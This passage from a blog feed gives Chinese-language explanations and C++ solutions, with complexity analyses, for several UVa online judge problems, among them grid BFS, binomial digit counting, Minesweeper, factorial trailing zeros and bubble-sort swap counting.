<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans,dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">bool</span> inq[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dis</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> fx,<span class="keyword">int</span> fy)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">abs</span>(x-fx)+<span class="built_in">abs</span>(y-fy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ok</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (x&gt;=<span class="number">0</span>) &amp;&amp; (x&lt;n) &amp;&amp; (y&gt;=<span class="number">0</span>) &amp;&amp; (y&lt;n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">queue</span>&lt;pii&gt; q;</span><br><span class="line">		<span class="built_in">vector</span>&lt;pii&gt; px;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">				<span class="keyword">if</span>(arr[i][j] == <span class="string">'1'</span>)&#123;</span><br><span class="line">					px.emplace_back(i,j);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//BFS every vector</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i: px)&#123;</span><br><span class="line">			<span class="keyword">int</span> fx,fy;tie(fx,fy)=i;</span><br><span class="line">			q.emplace(fx,fy);</span><br><span class="line">			inq[fx][fy]=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">				<span class="keyword">int</span> x,y;tie(x,y)=q.front();</span><br><span class="line">				q.pop();</span><br><span class="line">				<span class="comment">//end</span></span><br><span class="line">				<span class="keyword">if</span>(arr[x][y]==<span class="string">'3'</span>)&#123;</span><br><span class="line">					ans=max(ans, dis(x,y,fx,fy));</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">					<span class="keyword">int</span> nx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">					<span class="keyword">int</span> ny=y+dir[i][<span class="number">1</span>];</span><br><span class="line">					<span class="keyword">if</span>(ok(nx,ny) &amp;&amp; !inq[nx][ny])&#123;</span><br><span class="line">						inq[nx][ny]=<span class="literal">true</span>;</span><br><span class="line">						q.emplace(nx,ny);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">				q.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">105</span> ; j++)&#123;</span><br><span class="line">					inq[i][j]=<span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><ul>
<li>輸入<br>  $O(N^2)$</li>
<li>BFS<br>最糟會將地圖都跑過一遍，為$O(N^2)$<br>而起點最多N個<br>  $O(N^3)$</li>
</ul>
<p>整體複雜度: $O(N^3)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>BFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10219</title>
    <url>/2021/03/23/UVa10219/</url>
    <content><![CDATA[<h1 id="UVa-10219"><a href="#UVa-10219" class="headerlink" title="UVa 10219"></a>UVa 10219</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10219" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10219</a></p>
<p>求 $C_{m}^{n}$ 的數值是幾位數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>我們要求的是 $log_{10}{(C_{m}^{n})}+1=log_{10}{(\frac{n!}{(n-m)!m!})}+1$ 取整數後的值</p>
<p>已知</p>
<ul>
<li>$log{\frac{a}{b}}$ = $loga-logb$</li>
<li>$logab = loga + logb$</li>
</ul>
<p>則<br>$$log_{10}{(\frac{n!}{((n-m)!m!)})} \<br>= log_{10}{n!}-log_{10}{((n-m)!m!)} \<br>= \sum_{i=1}^{n}(log_{10}{i}) - log_{10}{(n-m)!}-log_{10}{m!} \<br>= \sum_{i=1}^{n}log_{10}{i}-\sum_{i=1}^{n-m}log_{10}{i}-\sum_{i=1}^{m}log_{10}{i} \<br>= \sum_{i=n-m+1}^{n}log_{10}{i}-\sum_{i=1}^{m}log_{10}{i}<br>$$</p>
<p>又因為 $n-(n-m+1) = m-1$ ，也就是說可以保證兩個 Sigma 跑的次數是相同的</p>
<p>所以在實作上只需要一個迴圈即可</p>
<p>另外，計算 $C_{m}^{n}$ 時，當我們的 $n\ /\ 2&gt;m$ 時，可以轉換成 $C_{n-m}^{n}$ ，讓數值變得更小一點</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">        <span class="keyword">double</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n/<span class="number">2</span> &lt;= m)&#123;</span><br><span class="line">            <span class="comment">// 需要轉換</span></span><br><span class="line">            m=n-m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 從1開始跑到m</span></span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=m)</span><br><span class="line">            ans += (<span class="built_in">log10</span>(n--) - <span class="built_in">log10</span>(i++));</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(<span class="keyword">int</span>)ans+<span class="number">1</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每次計算時間約為 $O(1)$，而需要計算 $m$ 次，每筆測資時間複雜度為 $O(m)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10189</title>
    <url>/2021/03/23/UVa10189/</url>
    <content><![CDATA[<h1 id="UVa-10189"><a href="#UVa-10189" class="headerlink" title="UVa 10189"></a>UVa 10189</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10189" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10189</a></p>
<p>有一個地雷區，寬與長分別為 $n, m$ ，地雷以 <code>*</code> 表示</p>
<p>輸出每個非地雷的點四周八個方向總共有多少個地雷</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於地圖上的每一個非地雷的點，直接檢查八個方向有多少地雷記錄下來即可</p>
<p>這裡有個小技巧，我們將八個方向 $x$ 和 $y$ 分別改變的大小用陣列記錄下來，接下來當我們要檢查八個方向，就只需要用 for 迴圈跑過一遍就可以了!</p>
<p>另外，這裡使用 cango 來判斷一個點是否超出範圍，在程式碼書寫上會變得更淺顯易懂</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,Case=<span class="number">1</span>,dir[<span class="number">8</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cango</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span> || x&gt;=n || y&lt;<span class="number">0</span> || y&gt;=m) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m &amp;&amp; (n||m))&#123;</span><br><span class="line">        <span class="keyword">if</span>(out)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            out=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Field #"</span>&lt;&lt;Case++&lt;&lt;<span class="string">":\n"</span>;</span><br><span class="line">        <span class="comment">// input</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m ; j++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// solve</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m ; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i][j] == <span class="string">'*'</span>)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;<span class="number">8</span> ; k++)&#123;</span><br><span class="line">                        <span class="comment">// 枚舉八個方向 </span></span><br><span class="line">                        <span class="keyword">int</span> nx=i+dir[k][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">int</span> ny=j+dir[k][<span class="number">1</span>];</span><br><span class="line">                        <span class="comment">// 點在範圍內 </span></span><br><span class="line">                        <span class="keyword">if</span>(cango(nx,ny))&#123;</span><br><span class="line">                            <span class="keyword">if</span>(arr[nx][ny] == <span class="string">'*'</span>)&#123;</span><br><span class="line">                                cnt++;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;cnt;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>輸入時間複雜度為 $O(nm)$</p>
<p>最差情況對於每個點都要檢查八個方向，複雜度為 $O(8nm)$</p>
<p>單筆測茲的時間複雜度為 $O(9nm)$ 約為 $O(nm)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10061</title>
    <url>/2021/03/23/UVa10061/</url>
    <content><![CDATA[<h1 id="UVa-10061"><a href="#UVa-10061" class="headerlink" title="UVa 10061"></a>UVa 10061</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10061" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10061</a></p>
<p>給兩個數 $n$, $m$ ，求</p>
<ol>
<li>$n!$ 在 $m$ 進位制下尾數有多少個 $0$</li>
<li>$n!$ 在 $m$ 進位制下是幾位數</li>
</ol>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><ol>
<li>幾位數</li>
</ol>
<p>問幾位數的問題比較簡單，如同前一題，只是進位制不同</p>
<p>要計算 在 $m$ 進位制下是幾位數，等同於計算 $log_{m}{n}+1$ 取整數</p>
<p>由於內建的函式庫並沒有直接計算 $log$ 底數為任意數的方式，這裡要使用換底公式</p>
<p>$$log_{a}{b} = \frac{log_{n}{b}}{log_{n}{a}}<br>$$</p>
<p>根據 $logab = loga + logb$ 的性質，可以得到</p>
<p>$$\sum_{i=1}^{n}{log_{m}{i}}<br>$$</p>
<p>兩個性質合起來</p>
<p>$$\sum_{i=1}^{n}{\frac{log_{10}{i}}{log_{10}{m}}}<br>$$</p>
<hr>
<ol start="2">
<li>尾數有多少個</li>
</ol>
<p>先從 10 進位開始想，尾數要是 0 則它必定會是 10 的整數倍</p>
<blockquote>
<p>例如: 10, 100, 1000, 1020 …</p>
</blockquote>
<p><strong>這個數一定要有 10 的因數</strong> ，也就是他必須要至少同時有一個 2 和 5 的質因數</p>
<p>換到其他進位制仍然相同</p>
<p>所以說，我們只需要紀錄 $n!, m$ 的質因數各有多少個</p>
<p>如果說 $m$ 的質因數有 $P={p_1, p_2, p_3}$</p>
<p>那麼 $n!$ 至少要包含整數倍的 $P$ ，才能是 $m$ 的整數倍</p>
<p>所以接下來針對 $m$ 的每個質因數 $i$ ，計算 $i$ 在 $n!$ 中的個數與在 $m$ 中的個數之比值，其中最小值就會是答案</p>
<blockquote>
<p>例如: $n=7,\ m=16$<br>整理一下 $n!$ 的質因數個數</p>
<table>
<thead>
<tr>
<th>tbl</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
</tr>
</thead>
<tbody><tr>
<td>個數</td>
<td>4</td>
<td>2</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
</tbody></table>
<p>整理一下 $m$ 的質因數個數</p>
<table>
<thead>
<tr>
<th>mPrime</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
</tr>
</thead>
<tbody><tr>
<td>個數</td>
<td>4</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
</tbody></table>
<p>所以說，必須至少含有 4 個 2 ，尾數才能有一個 0<br>這裡可以發現答案是 $tbl[2]/mPrime[2] = 1$</p>
</blockquote>
<hr>
<ol start="3">
<li>質因數個數</li>
</ol>
<p>至於質因數個數的部分，我們可以先預先建立一個表格，紀錄每個數字內的最小質數</p>
<blockquote>
<p>例如: 10 -&gt; 2 ; 7 -&gt; 7 ; 9 -&gt; 3</p>
</blockquote>
<p>接下來，我們每次除以最小質因數，經過的就會是他的質因數了</p>
<p>例如: 36 –(/2)–&gt; 18 –(/2)–&gt; 9 –(/3)–&gt; 3 –(/3)–&gt; 1</p>
<p>求得 $36 = 2^2\times3^2$</p>
<ol start="4">
<li>數字內最小質因數</li>
</ol>
<p>他就會像是這樣，將每個是自己倍數的數值紀錄成自己</p>
<p>例如: 偶數都會被記錄成 2 , 質數都會記錄成自己</p>
<p><img src="https://i.imgur.com/0ghjKd8.gif" alt=""></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">1048577</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,prime[MaxN],tbl[MaxN],mPrime[MaxN];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;MaxN ; i++)&#123;</span><br><span class="line">		tbl[i]=<span class="number">0</span>;</span><br><span class="line">		mPrime[i]=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> tmp=m;</span><br><span class="line">	<span class="keyword">while</span>(tmp&gt;<span class="number">1</span>)&#123;</span><br><span class="line">		mPrime[prime[tmp]]++;</span><br><span class="line">		tmp/=prime[tmp];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_tbl</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(x&gt;<span class="number">1</span>)&#123;</span><br><span class="line">		tbl[prime[x]]++;</span><br><span class="line">		x/=prime[x];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_prime</span><span class="params">()</span></span>&#123;</span><br><span class="line">	prime[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(prime[i]) <span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;=MaxN ; j+=i)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!prime[j])</span><br><span class="line">				prime[j]=i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	update_prime();</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">		init();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			update_tbl(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans1=<span class="number">2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;=m ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(mPrime[i])&#123;</span><br><span class="line">				ans1=min(ans1, tbl[i]/mPrime[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">double</span> ans2=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			ans2+=<span class="built_in">log</span>(i)/<span class="built_in">log</span>(m);</span><br><span class="line">		&#125;</span><br><span class="line">		ans2=(<span class="keyword">int</span>)(ans2)+<span class="number">1</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">0</span>)&lt;&lt;ans1&lt;&lt;<span class="string">' '</span>&lt;&lt;ans2&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>預處理質數時間複雜度約為 $O(NlogN)$</p>
<p>每次初始化的時間複雜度約為 $O(N+logm)$</p>
<p>計算尾數的時間複雜度約為 $O(m)$</p>
<p>計算位數的時間複雜度約為 $O(n)$</p>
<p>總時間複雜度約為 $O(NlogN+(測資數量)\times(N+logm+m+n))$</p>
<p>大約為 $O(NlogN+(測資數量)\times(N))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10327</title>
    <url>/2021/03/23/UVa10327/</url>
    <content><![CDATA[<h1 id="UVa-10327"><a href="#UVa-10327" class="headerlink" title="UVa 10327"></a>UVa 10327</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10327" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10327</a></p>
<p>題目包含多筆測試資料，每筆測試資料第一行有一個正整數 $n$，接下來有 $n$ 個數字</p>
<p>求將這個序列由小到大排序需要最少只需要交換多少次</p>
<p>$n \leq 1000$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為這一題的 $n$ 很小，所以我們可以直接實作 bubble sort，然後計算我們總共交換了幾次</p>
<p>如果說 $n$ 很大，那就需要用 merge sort 來實作，不過這裡就不實作了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, ans, arr[<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bubble_sort</span><span class="params">()</span></span>&#123;</span><br><span class="line">	ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n<span class="number">-1</span>-i ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[j] &gt; arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">				swap(arr[j], arr[j+<span class="number">1</span>]);</span><br><span class="line">				ans++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		bubble_sort();</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Minimum exchange operations : "</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>每筆測資排序時間複雜度為 $O(n^2)$</p>
<p>每筆測資總時間複雜度為 $O(n + n^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10282</title>
    <url>/2021/04/01/UVa10282/</url>
    <content><![CDATA[<h1 id="UVa-10282"><a href="#UVa-10282" class="headerlink" title="UVa 10282"></a>UVa 10282</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10282" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10282</a></p>
<p>題目會先給你每個英文字對應到的外國文字，這群對應的字保證是一對一，形成一個字典</p>
<p>接下來會有多筆詢問，輸入一個外國文字，輸出相對應的英文字，如果不存在則輸出 <code>eh</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這題可以直接用 map 對應，但是這裡我們用二分搜來實作看看</p>
<p>首先先把字典建立好，可以用一個 struct 來建立每個英文字對應到的外國字，接下來排序，方便我們查詢</p>
<p>最後用二分搜就可以了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>, res, res2;</span><br><span class="line"><span class="built_in">string</span> s, key, value, q;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">word</span>&#123;</span></span><br><span class="line">	<span class="built_in">string</span> key;</span><br><span class="line">	<span class="built_in">string</span> value;</span><br><span class="line">&#125;;</span><br><span class="line">word dict[<span class="number">100010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(word p, word q)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p.value != q.value) <span 